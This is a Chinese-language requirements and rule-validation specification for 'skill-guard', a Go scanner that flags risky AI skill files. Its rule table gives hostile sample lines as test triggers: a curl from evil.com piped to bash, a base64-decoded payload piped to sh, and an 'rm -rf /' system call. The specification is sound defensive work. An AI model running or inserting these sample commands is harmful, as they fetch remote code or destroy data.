## 一、需求说明文档

### 1. 项目背景与目标

**背景**：AI 辅助开发中，技能（Skill）多由社区或第三方提供，以 Markdown、JSON、YAML、Python 等文件形式存在，可能包含恶意代码、密钥泄露、异常网络请求等安全风险。现有的 `skscan` 基于 Node.js，需要运行时环境，且功能相对固定。

**目标**：开发一个用 Go 语言编写的命令行工具（代号 `skill-guard`），实现零依赖的单一可执行文件，提供快速、可扩展、可自定义规则的安全扫描能力。

### 2. 目标用户

- **开发者**：在集成第三方技能前进行本地审查。
- **团队/企业**：在 CI/CD 流程中对技能库做安全卡点。
- **安全工程师**：自定义检测规则，深度审查技能内容。

### 3. 功能需求

#### FR-1 目录扫描
- 支持扫描单个或多个目录（如 `.`、`./skills`、`/path/to/repo`）。
- 递归遍历子目录，默认忽略 `.git`、`node_modules`、`vendor` 等无关目录。
- 可通过参数添加额外的忽略路径或模式。

#### FR-2 文件类型支持
- 默认扫描常见文本文件：`.md`、`.json`、`.yaml`、`.yml`、`.py`、`.sh`、`.js`、`.ts`、`.toml`、`.xml` 等。
- 可配置只扫描特定扩展名，或排除特定扩展名。

#### FR-3 规则检测引擎
- 内置至少 **30 条**默认规则，覆盖：
  - 硬编码密钥（API Key、Token、私钥）
  - 可疑命令执行（`exec`、`system`、`eval` 等）
  - 恶意文件操作（`rm -rf`、任意文件写入）
  - 网络请求滥用（`curl` 到外部地址、下载执行）
  - 权限提升（`sudo`、`chmod 777` 等）
  - 信息窃取模式（`cat ~/.ssh`、`env` 泄露）
  - 混淆代码特征（Base64 长串、Hex 编码命令）
- 支持规则分为 **Critical / High / Medium / Low** 四个严重级别。
- 支持正则表达式和简单关键字匹配两种模式。

#### FR-4 自定义规则
- 用户可提供 `rules.yaml` 或 `rules.json` 文件，加载自定义规则。
- 自定义规则可覆盖或追加内置规则。
- 规则格式清晰，易于编写和分享。

#### FR-5 输出格式
- 终端彩色输出（Windows 兼容），清晰展示：文件路径、行号、风险级别、规则ID、匹配内容摘要。
- 支持 `--json` 输出完整结果，便于其他工具处理。
- 支持 `--quiet` 仅显示有问题文件（不显示“扫描完成”等提示）。
- 支持 `--severity` 过滤（如 `--severity high` 只显示 High 及以上）。

#### FR-6 退出码
- 无风险：退出码 `0`
- 发现风险：退出码 `1`（便于 CI 流程判断）
- 运行错误（如目录不存在）：退出码 `2`

#### FR-7 配置管理
- 支持通过 `.skillguard.yaml` 文件配置（如忽略路径、自定义规则位置、默认严重级别过滤）。
- 命令行参数优先于配置文件。

#### FR-8 扫描性能
- 利用 Go 的并发特性，文件解析并行执行，扫描速度优于同类 Node.js 工具 2 倍以上（在 1000 个文件场景下）。
- 提供进度提示（例如 `--verbose` 显示已扫描文件数）。

### 4. 非功能需求

- **零依赖部署**：编译为单一可执行文件，无需安装 Go 或其他运行时。
- **跨平台**：支持 Linux、macOS、Windows（amd64、arm64）。
- **易安装**：提供 `curl | sh`、`brew`、`scoop`、直接下载二进制等方式。
- **内存与 CPU 消耗**：在扫描 10000 个文件时，内存占用不超过 50 MB。
- **规则可扩展**：内部采用接口设计，未来可支持 LUA 脚本规则或 AI 辅助检测。
- **文档完善**：提供 README、内置帮助信息、规则编写指南。

### 5. 用户故事示例

- 作为普通用户，我想在终端运行 `./skill-guard ./downloaded-skills` 立刻知道哪些文件有风险，以便决定是否使用该技能。
- 作为安全工程师，我想定义自己的正则规则来检测公司内部禁止的模式。
- 作为 CI 流水线维护者，我想通过 `--json --severity high` 获取结构化结果，并让流水线在发现高危时失败。

## 二、规则验证文档

### 1. 规则格式定义

每条规则为一个 YAML/JSON 对象，包含以下字段：

| 字段名        | 类型     | 必填 | 说明                                                    |
| :------------ | :------- | :--- | :------------------------------------------------------ |
| `id`          | string   | 是   | 唯一标识，如 `SLD-001`                                  |
| `name`        | string   | 是   | 短名称，如 "硬编码 AWS 密钥"                            |
| `severity`    | string   | 是   | Critical / High / Medium / Low                          |
| `description` | string   | 是   | 详细解释该规则的目的                                    |
| `pattern`     | string   | 是   | 正则表达式（符合 RE2）                                  |
| `keywords`    | []string | 否   | 辅助关键字，用于预过滤文件（提高性能）                  |
| `file_types`  | []string | 否   | 限定扫描的文件扩展名，如 `[".py", ".sh"]`，空则扫描所有 |
| `ref`         | string   | 否   | 参考资料链接                                            |

### 2. 内置规则清单（节选 8 条示例）

| ID      | Severity | 描述                     | 匹配模式（简化）                                 | 测试样例（应该触发）                                   | 不应触发                           |
| :------ | :------- | :----------------------- | :----------------------------------------------- | :----------------------------------------------------- | :--------------------------------- |
| SKL-001 | Critical | 硬编码 AWS Access Key    | `(?i)AKIA[A-Z0-9]{16}`                           | `AKIAIOSFODNN7EXAMPLE`                                 | `AKIA` 后接非 16 位大写            |
| SKL-002 | Critical | 私钥文件泄露             | `-----BEGIN (RSA|OPENSSH|EC) PRIVATE KEY-----`   | `-----BEGIN RSA PRIVATE KEY-----`                      | `-----BEGIN PUBLIC KEY-----`       |
| SKL-003 | High     | 可疑的命令执行（Python） | `os\.system\s*\(`                                | `os.system("rm -rf /")`                                | `# os.system is dangerous`（注释） |
| SKL-004 | High     | 下载并执行脚本           | `curl.*\|.*(bash|sh|python)`                     | `curl -s http://evil.com/s.sh \| bash`                 | 不存在 `\|` 连接                   |
| SKL-005 | Medium   | 硬编码密码赋值           | `(password|passwd|pwd)\s*[:=]\s*["'][^"'\s]{6,}` | `password = "secret123"`                               | `password = os.getenv("DB_PASS")`  |
| SKL-006 | Medium   | Base64 编码的可疑命令    | `echo\s+[A-Za-z0-9+/=]{20,}\s*\|.*base64.*-d`    | `echo d2dldCAtTyAtIHNvbWV0aGluZw== \| base64 -d \| sh` | 正常短 Base64 值                   |
| SKL-007 | Low      | 过于宽松的文件权限设置   | `chmod\s+777`                                    | `chmod 777 /var/www`                                   | `chmod 755`                        |
| SKL-008 | Low      | 使用 `eval` （通用脚本） | `\beval\s*\(`                                    | `eval(input())` (Python) / `eval(` (JS)                | 注释内的 `eval`                    |

### 3. 规则验证流程

在开发过程中，每个规则都需要通过以下验证步骤：

#### 3.1 单元测试
- 为每条规则创建 **正面测试用例**（至少 5 个），确保可以捕获已知危险模式。
- 创建 **负面测试用例**（至少 3 个），确保不会对安全代码产生误报（如注释中的命令、环境变量读取）。
- 所有用例存储于 `rules/` 目录下，通过 `go test` 自动执行。

#### 3.2 边界条件测试
- **超长行**（10KB 以上）：正则是否正常匹配、性能是否线性。
- **Unicode/特殊字符**：例如密钥中包含 `$`、`\` 等。
- **跨行模式**：当前仅假设按行匹配，若规则需跨行则需特殊说明。
- **文件编码**：支持 UTF-8，如遇非 UTF-8 文件则跳过并给出警告。

#### 3.3 性能基准
- 每条规则在同一样本集（1000 个混合文件）下的单次扫描耗时需 < 50ms。
- 多规则并发扫描时，总体耗时与文件数量呈线形，且 CPU 利用率合理。

#### 3.4 真实样本验证
- 从 GitHub 收集公开的恶意技能样本（如已被安全厂商标记的钓鱼 Skill 文件）。
- 使用工具扫描，确认检出率不低于 80%。
- 对误报率过高的规则进行调优（添加 `file_types` 限制、排除注释/字符串等）。

### 4. 规则贡献规范

- 新规则提案需要附带：规则文件、测试用例文件、误报评估说明。
- 规则 ID 遵循 `SKL-<序号>` 格式，自定义规则建议用 `USR-xxx` 避免冲突。
- 所有内置规则应配有注释，解释为何认为该模式危险。

### 5. 持续更新

规则库将跟随恶意技能演变定期更新，版本号与工具同步。用户运行 `skill-guard update` 可拉取最新规则（若实现远程加载）。
